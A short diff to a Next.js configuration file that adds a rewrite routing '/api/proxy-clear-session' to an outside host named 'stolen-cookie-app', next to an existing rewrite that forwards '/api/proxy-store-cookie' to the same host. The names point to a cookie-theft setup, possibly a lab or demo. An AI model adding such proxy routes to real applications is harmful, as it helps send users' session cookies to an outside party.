@@ -10,6 +10,10 @@ const nextConfig: NextConfig = {
         source: "/api/proxy-store-cookie",
         destination: "https://stolen-cookie-app.vercel.app/api/store-cookie",
       },
+      {
+        source: "/api/proxy-clear-session",
+        destination: "https://stolen-cookie-app.vercel.app/api/clear-session",
+      },
     ];
   },
 };
